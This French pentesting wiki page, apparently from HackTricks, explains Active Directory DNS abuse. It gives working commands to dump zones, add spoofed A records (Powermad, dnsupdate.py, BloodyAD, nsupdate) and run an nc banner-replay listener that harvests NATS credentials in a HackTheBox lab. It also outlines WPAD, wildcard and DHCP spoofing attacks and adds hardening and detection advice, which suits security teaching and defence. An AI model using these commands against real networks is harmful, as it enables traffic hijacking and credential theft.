# Enregistrements DNS AD

{{#include ../../banners/hacktricks-training.md}}

Par défaut, **tout utilisateur** dans Active Directory peut **énumérer tous les enregistrements DNS** des zones DNS du domaine ou de la forêt, comme lors d’un transfert de zone (les utilisateurs peuvent lister les objets enfants d’une zone DNS dans un environnement AD).

L’outil [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) permet l’**énumération** et l’**exportation** de **tous les enregistrements DNS** de la zone à des fins de recon des réseaux internes.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (avril 2025) ajoute une sortie JSON/Greppable (`--json`), la résolution DNS multi-thread et la prise en charge de TLS 1.2/1.3 lors de la connexion à LDAPS

Pour plus d’informations, consultez [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Création / modification d’enregistrements (ADIDNS spoofing)

Comme le groupe **Authenticated Users** dispose par défaut de l’autorisation **Create Child** sur la DACL de la zone, tout compte de domaine (ou compte ordinateur) peut enregistrer des enregistrements supplémentaires. Cela peut être utilisé pour détourner le trafic, provoquer une coercition NTLM relay ou même compromettre entièrement le domaine.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py est fourni avec Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Primitives d’attaque courantes

1. **Enregistrement wildcard** – `*.<zone>` transforme le serveur AD DNS en un responder à l’échelle de l’entreprise, similaire au spoofing LLMNR/NBNS. Il peut être utilisé pour capturer des hashes NTLM ou les relayer vers LDAP/SMB.  (Nécessite que la recherche WINS soit désactivée.)<sup>[[1]](#references)</sup>
2. **Détournement WPAD** – ajouter `wpad` (ou un enregistrement **NS** pointant vers un host contrôlé par l’attaquant afin de contourner la Global-Query-Block-List) et proxifier de manière transparente les requêtes HTTP sortantes pour récolter des credentials. Microsoft a corrigé les contournements wildcard/DNAME (CVE-2018-8320), mais les **enregistrements NS fonctionnent toujours**.<sup>[[1]](#references)</sup>
3. **Prise de contrôle d’une entrée obsolète** – réclamer l’adresse IP qui appartenait précédemment à une workstation ; l’entrée DNS associée continuera à se résoudre, permettant des attaques de resource-based constrained delegation ou de Shadow-Credentials sans toucher au DNS.
4. **DHCP → DNS spoofing** – dans un déploiement Windows DHCP+DNS par défaut, un attaquant non authentifié présent sur le même subnet peut écraser n’importe quel enregistrement A existant (y compris ceux des Domain Controllers) en envoyant des requêtes DHCP forgées qui déclenchent des mises à jour DNS dynamiques (Akamai « DDSpoof », 2023). Cela permet une attaque machine-in-the-middle contre Kerberos/LDAP et peut conduire à une prise de contrôle complète du domaine.<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – modifier le `dNSHostName` d’un machine account que vous contrôlez, enregistrer un enregistrement A correspondant, puis demander un certificat pour ce nom afin d’usurper l’identité du DC. Des outils tels que **Certipy** ou **BloodyAD** automatisent entièrement ce processus.

---

### Détournement de services internes via des enregistrements dynamiques obsolètes (étude de cas NATS)

Lorsque les mises à jour dynamiques restent ouvertes à tous les utilisateurs authentifiés, **un nom de service désenregistré peut être réclamé à nouveau et pointer vers une infrastructure contrôlée par l’attaquant**. Le DC Mirage HTB exposait le hostname `nats-svc.mirage.htb` après le nettoyage DNS, de sorte que tout utilisateur disposant de faibles privilèges pouvait :<sup>[[3]](#references)</sup>

1. **Confirmer que l’enregistrement est absent** et apprendre le SOA avec `dig` :
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Recréer l’enregistrement** vers une interface externe/VPN qu’ils contrôlent :
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Usurper le service en clair**. Les clients NATS s’attendent à recevoir une bannière `INFO { ... }` avant d’envoyer leurs identifiants. Il suffit donc de copier une bannière légitime du broker réel pour récolter les secrets :
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Tout client qui résout le nom hijacked leakera immédiatement sa trame JSON `CONNECT` (y compris `"user"`/`"pass"`) au listener. Exécuter le binaire officiel `nats-server -V` sur l’hôte de l’attaquant, désactiver la redaction des logs ou simplement sniffer la session avec Wireshark produit les mêmes identifiants en clair, car TLS était optionnel.

4. **Pivot avec les identifiants capturés** – dans Mirage, le compte NATS volé fournissait un accès à JetStream, ce qui exposait des événements d’authentification historiques contenant des noms d’utilisateur/mots de passe AD réutilisables.

Ce pattern s’applique à tout service intégré à AD qui repose sur des handshakes TCP non sécurisés (APIs HTTP, RPC, MQTT, etc.) : une fois l’enregistrement DNS hijacked, l’attaquant devient le service.

---

## Détection et hardening

* Refuser à **Authenticated Users** le droit *Create all child objects* sur les zones sensibles et déléguer les mises à jour dynamiques à un compte dédié utilisé par DHCP.
* Si les mises à jour dynamiques sont nécessaires, définir la zone sur **Secure-only** et activer **Name Protection** dans DHCP afin que seul l’ordinateur propriétaire puisse écraser son propre enregistrement.
* Surveiller les IDs d’événement DNS Server 257/252 (mise à jour dynamique), 770 (transfert de zone) ainsi que les écritures LDAP vers `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloquer les noms dangereux (`wpad`, `isatap`, `*`) avec un enregistrement volontairement bénin ou via la **Global Query Block List**.
* Maintenir les serveurs DNS à jour – par exemple, les vulnérabilités RCE CVE-2024-26224 et CVE-2024-26231 ont atteint un score **CVSS de 9.8** et sont exploitables à distance contre des Domain Controllers.

## Références

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, toujours la référence de facto pour les attaques wildcard/WPAD)
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (déc. 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
